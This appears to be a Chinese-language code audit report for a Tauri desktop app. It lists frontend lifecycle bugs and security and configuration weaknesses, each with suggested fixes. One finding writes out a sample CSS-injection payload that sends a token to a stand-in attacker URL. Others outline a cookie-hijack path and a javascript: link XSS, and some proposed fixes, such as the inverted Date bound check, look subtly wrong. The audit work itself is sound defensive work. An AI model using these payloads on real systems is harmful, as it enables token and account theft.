# 子域 A:前端核心审查报告

## 概览
- 审查文件:22 个 .ts 文件 (主入口 + settings 子模块),约 8,267 行
- 总 bug 数:12 (CRITICAL 1 / HIGH 5 / MEDIUM 4 / LOW 2)
- 整体健康度评分:**7/10**(XSS 防御成熟,主要风险在事件/资源生命周期管理)

## CRITICAL

### A-C1:浮窗 init 失败时 `app.innerHTML` 注入 + 事件委托残留导致 IPC 不可达
- **位置**:`src/main.ts:1469`
- **问题**:`get_snapshot` / `refresh_now` IPC 抛出时,`app.innerHTML` 把 `<button class="err-btn open-settings">` 注入。但 click handler(同文件 1485 行)只在 `app.addEventListener("click", ...)` 注册一次,写在前面的 init() 同步 try/catch 之后 → 如果 try 块里 `await invoke<QuotaSnapshot>("get_snapshot")` 抛出,而 click handler 注册代码在 init() 后面才会执行,catch 早 return → handler 没注册,open-settings 按钮就**死锁,用户点不开设置面板**。
- **触发路径**:首启 / 密钥损坏 / Rust 端 emit 还没建立 → get_snapshot 抛 → catch 执行 innerHTML 注入 → 用户看红卡 + open-settings 按钮 → 点击没反应。
- **修法**:`init()` 改成 try { 注册 listener; await invoke; render } catch(放在 listener 注册之后)`。

## HIGH

### A-H1:order.ts 拖拽监听器在 mouseup 抛错时泄漏(绑 document 级)
- **位置**:`src/settings/order.ts:261-360`
- **问题**:`removeEventListener` 调用之前是空 if-return 守卫,但守卫通过后,如果 `currentProviderOrder.indexOf(...)` 抛错,`dragging`/`dividerDragging` 状态不会重置,document 上的 mousemove/mouseup 监听器**永远不释放** → 后续每次鼠标移动都触发幽灵 ghost 渲染。
- **修法**:`try/finally { removeEventListener }`。

### A-H2:main.ts 浮窗 `app.addEventListener("mousedown"/"dblclick"/"click")` 在 beforeunload 不卸载 → dev HMR / 重渲累积
- **位置**:`src/main.ts:1266-1287`、`1474-1535`
- **问题**:`app.addEventListener` 都是匿名函数(无法 remove),且 beforeunload handler **没有调用对应的 removeEventListener**。
- **触发**:dev HMR 每次重载 init() → 浮窗上累积 N 套 handler → 一次拖动触发 N 次 `startDragging()` IPC。
- **修法**:把 mousedown/dblclick/click 也存到 `unlistenX` 变量(或返回 AbortController)。

### A-H3:`renderEmptyState()` 用 `app.innerHTML` 全量覆盖,与增量 render 互斥
- **位置**:`src/main.ts:653-664`
- **问题**:`renderEmptyState` 每次都 `app.innerHTML = ...`,完全破坏 render() 的增量 DOM 更新机制 — `.card[data-provider]`、`.row[data-row-key]`、`.foot` 都被 wipe。同时丢失 inline style(CSS 变量)。
- **修法**:`renderEmptyState()` 也用增量模式,或把 empty state 提升为 module-scope 单例。

### A-H4:`setupHoverRaise()` 在 body 上 addEventListener,初始状态 + 重入不幂等
- **位置**:`src/main.ts:1608-1624`
- **问题**:pin-mode-changed handler 有 removeEventListener 前置,但 **`init()` 阶段第一次 `setupHoverRaise(cfg.floating_pin_mode)` 没有前置 remove**。dev HMR 重跑 init,**init 跑两次** → body 上累积两份 listener。
- **修法**:加 `if (hoverHandlerInstalled) return;` 守卫。

### A-H5:`formatResetWithCountdown` 未防御 Date 上限
- **位置**:`src/main.ts:1112-1116`、`1181-1208`
- **问题**:`new Date(ms)` 远超 `8.64e15` → Invalid Date → `dt.getMonth()` 返 NaN → 字符串 `"NaN-NaN 5h重置"` 出现在 UI。
- **修法**:`if (!Number.isFinite(ms) || ms < 8.64e15)` 双阈值检查。

## MEDIUM

### A-M1:`flash()` (settings/utils.ts) module-scope timer 在 beforeunload 不清
- **位置**:`src/settings/utils.ts:108-140`
- **修法**:`window.addEventListener("beforeunload", () => { if (flashTimer) clearTimeout(flashTimer); })`。

### A-M2:`saveCredentialAction` flash 错误类型不一致 — 多行 cookie 自动取首行是提示而非错误
- **位置**:`src/settings/credentials.ts:653-672`
- **修法**:改成 `flash(..., false)` 或新增 `warn` 级别。

### A-M3:order.ts `boundaryIdx()` 与 `currentProviderOrder.indexOf` 在 buildRow 重入时不一致
- **位置**:`src/settings/order.ts:153-161`、`683-693`
- **触发**:用户全新安装 → settings 首次开 → divider 不能拖。
- **修法**:boundaryIdx 改为读「buildOrderItems 实际分段后的 enabledIds.length」。

### A-M4:`saveTavilyKey` 等 legacy 函数仍 `await import("./api")` 二次载入
- **位置**:`src/settings/credentials.ts:103-107`、`126-130`、`147-151`
- **修法**:去掉函数内 `await import("./api")`,用顶部已 import 的 `refreshNow`。

## LOW

### A-L1:`el()` helper 对 `href="javascript:..."` 没有防护
- **位置**:`src/settings/utils.ts:60-78`
- 当前没有触发(所有 href 都是硬编码 `https://...`),但**未来如果 el() 的 attrs 用模板字符串拼用户输入,会被 `javascript:` XSS**。

### A-L2:`BATCH_PREFIX_RULES` 顺序错位导致短前缀抢吃 — `sk-` 通用前缀把 zenmux/kimi/siliconflow 都误归 minimax
- **位置**:`src/settings/credentials.ts:1118-1131`
- **修法**:`sk-` 通用前缀要么删掉,要么用 host 识别。

## 未发现问题的亮点
- `i18n/index.ts::t()` 完整防御 missing key / non-string / 占位符 `\w.-` 兼容 / dev 收集器
- `main.ts::escapeHtml` 5 字符全覆盖,在所有 innerHTML 模板里强制 escape
- `extra-instance-form.ts::sanitizeField` 512 字符 + ASCII 控制字符过滤
- `order.ts::withSuppress` 计数式 reentrance 守卫(优于 boolean flag)
- `credentials.ts` 三个 `_listenersBound` 守卫
- `advanced.ts::setSchemaOverrides` debounce 300ms

---

# 子域 B:跨模块辅助 + 安全/配置审查报告

## 概览
- 审查文件:`src-tauri/src/providers/parse.rs`、`src-tauri/src/logstore.rs`、`src/i18n/index.ts`、`src-tauri/tauri.conf.json`、`src-tauri/capabilities/*.json`、`src-tauri/entitlements.plist`、`src-tauri/Cargo.toml`、`src/assets.d.ts`、`src/tokens.css`
- 总 bug 数:9 (CRITICAL 0 / HIGH 4 / MEDIUM 3 / LOW 2)
- 整体健康度评分:**8/10**(Rust 端辅助层较扎实,主要问题在 capability / 配置层)

## CRITICAL

(无 — Rust 端辅助层与配置层未发现会导致立即 exploit 的 bug)

## HIGH

### B-H1:`capabilities/{xiaomi,anysearch,stepfun}-login.json` 共享 `core:webview:allow-create-webview-window` 权限,任一被劫持就可能跨域
- **位置**:`src-tauri/capabilities/xiaomi-login.json:7`、`anysearch-login.json:7`、`stepfun-login.json:7`
- **问题**:`core:webview:allow-create-webview-window` 是**全 webview 创建权**(不是限定 URL)。一旦登录 window 被注入(改 hosts 让 platform 域解析到恶意 server),后端 `extract_and_save` 读 cookie 时不知道 cookie 来自哪个 origin,**会把恶意 cookie 当真实 cookie 写进 keys.json**,然后下次 fetch 直接打到真服务 → cookie 泄露 / 账号被劫持。
- **触发**:用户 DNS 污染 / hosts 文件被改 / 同网络 MITM → 登录 window 弹的是 attacker 控制页 → Set-Cookie 塞 `api-platform_serviceToken=...` → 写到 keys.json → attacker 用 cookie 登录。
- **修法**:Tauri 2 必须配合 `core:webview:allow-create-webview-window-with-specific-urls` + URL 白名单。当前 capabilities 文件缺这个 URL allowlist。

### B-H2:`tauri.conf.json` CSP 含 `style-src 'unsafe-inline'` 但代码里有 inline `style="..."` 调用
- **位置**:`src-tauri/tauri.conf.json:35`、`src/settings/extra-instance-form.ts:104`、`src/settings/floating.ts:301-345`
- **问题**:CSP `style-src 'unsafe-inline'` 允许 inline `<style>` 和 element-level `style="..."` attribute。未来如果 el() 的 attrs 用模板字符串拼用户输入,attacker 通过 `linear-gradient(...); background-image: url('https://attacker/...')` 注入 CSS 伪协议 → 浮窗 token 被外发(经典 CSS exfil)。
- **修法**:CSP 去掉 `'unsafe-inline'`,改用 nonce / hash;或严格审查所有 `style` attribute 调用方,禁止拼用户输入。

### B-H3:`logstore.rs::load_from_disk` 不强制 0600,旧用户文件权限泄漏
- **位置**:`src-tauri/src/logstore.rs:108-130`
- **问题**:`append_entry` 写的时候有 `set_permissions(... 0o600)`,但 **`load_from_disk` 在首次启动读时不强制** → 用户从老版本升级,旧 `.jsonl` 文件保留旧权限(可能是 0644)→ 同机其他用户**可读 history 错误日志**,日志 `message` 字段可能含 API key / cookie(从 `provider: None / Some` 错误串里透出)。
- **修法**:`load_from_disk` 开头加 `set_permissions(path, 0o600)`,与 `append_entry` 对齐。

### B-H4:settings.html / index.html CSP meta 缺失 + content-security-policy meta 兜底靠 Tauri runtime
- **位置**:`src-tauri/tauri.conf.json:35`、`index.html`、`settings.html`
- **问题**:HTML 文件没有 `<meta http-equiv="Content-Security-Policy">`,完全依赖 Tauri runtime 通过 IPC 设置的 CSP。**dev 模式** (`pnpm tauri:dev`) 下 Vite dev server 不会强制 `app.security.csp` 注入 — dev 模式下 CSP **不存在**,任意 inline script / external resource 可加载。
- **修法**:dev URL 用 mock CSP / meta tag fallback;或配 `app.security.devCsp` 字段。

## MEDIUM

### B-M1:`parse.rs::read_path` 对 Unicode 全角/半角同类字符不区分,允许 homograph 注入
- **位置**:`src-tauri/src/providers/parse.rs:30-100`
- **问题**:`buf.push(c)` 不区分 Unicode normal form,`data.balance` 和 `data.Ьalance`(西里尔 Ь)和 `data.ｂａｌａｎｃｅ`(全角拉丁)被当成不同 path。攻击者提供 custom source spec 时,把 `balance_path` 写成 `data.ｂalance`,与真实 `data.balance` 长得一样但走不到 → 静默取不到数 / 报错。
- **修法**:NFKC 规范化 segment 名。

### B-M2:`i18n/index.ts::setLocale` 失败回滚不重发 listeners,跨窗口 UI 不同步
- **位置**:`src/i18n/index.ts:118-148`
- **问题**:`current = l` → 触发后续 t() 用新 locale → 后端 IPC 失败回滚 `current = prev` → 但 listeners 不通知 → 各 `onLocaleChange` 回调内的 `applyDataI18n` / `renderProvidersSection` **不重跑**,DOM 里的 textContent 已经是新 locale 翻译(因为渲染时是同步读 current) → 但 `current` 实际是旧 locale,下次 t() 又是旧翻译,**UI 出现两种 locale 字符串混杂**。
- **修法**:回滚路径也触发 listeners,或在 IPC 之前**先**存 prev 不改 current。

### B-M3:`Cargo.toml::base64 = "0.22"` 依赖未钉 patch version,潜在 CVE 风险
- **位置**:`src-tauri/Cargo.toml:42`
- **问题**:`base64 0.22.x` 历史上有 RUSTSEC-2024-0429。**版本未钉 patch 号**(`= "0.22"` 而非 `= "0.22.1"`),未来 0.22 系列若有新 CVE 自动继承。
- **修法**:`base64 = "=0.22.1"` 或更新到 0.23。

## LOW

### B-L1:`entitlements.plist` 注释了"app-sandbox 不开",但 macOS App Store 提交时会拒绝
- **位置**:`src-tauri/entitlements.plist:24-29`
- **问题**:**无沙盒 = 同机任何进程(浏览器、其他 app、shell 脚本)都能访问你的 `keys.json`**。chmod 0600 只挡普通用户读,挡不住 root / 自己的其他进程。
- **修法**:macOS sandbox + Level 调整用合法 API(`orderFrontRegardless`)。或者加 Keychain 备份。

### B-L2:`assets.d.ts` 漏声明 `*.json` 模块
- **位置**:`src/assets.d.ts:1-29`
- **影响**:纯 tsc 阶段无声明,Editor IntelliSense 报错(虽然 build 不挂)。
- **修法**:`declare module "*.json" { const src: any; export default src; }`。

## 未发现问题的亮点

- `logstore.rs::append_entry` 走后台 worker 线程 + flush + sync_all,关键错误日志掉电不丢
- `logstore.rs::truncate_file_from_ring` 用 tmp + rename 原子替换
- `parse.rs::MAX_SEGMENTS=32` 防止恶意嵌套 JSON 递归栈溢出
- `parse.rs::num_f64` 拒 NaN/Infinity 字符串,保护前端渲染
- `parse.rs::read_path` 拒前导 `..`,防路径遍历
- `tauri.conf.json::bundle.targets` 已从 `["all"]` 改为 `["nsis", "dmg"]`,规避 WiX 镜像 timeout
- `capabilities/{floating,settings}.json` 已拆分,process:default 只给 settings window
- `entitlements.plist` 给 WebView 内部 JIT + unsigned executable memory 的合法 entitlement
- `Cargo.toml::panic = "unwind"` 让 spawn panic 被 tokio runtime 捕获
- `i18n/index.ts::lookupInDict` 贪心最长匹配
- `assets.d.ts::*.svg?url` 显式声明,Vite emit 不内联,CSP `data:` 不放行也不会裂 logo

## 整体建议

1. **优先修 A-C1**(浮窗 init 错误回退点击死锁)
2. **优先修 B-H1**(capabilities URL 白名单) — 真实 attack surface
3. **优先修 A-H1 / A-H2**(拖拽监听器 / 浮窗 event listener 泄漏)
4. **次修 B-H3**(logstore 读时不强制 0600)
5. 其余 HIGH/MEDIUM 可按风险评级排入下个 sprint
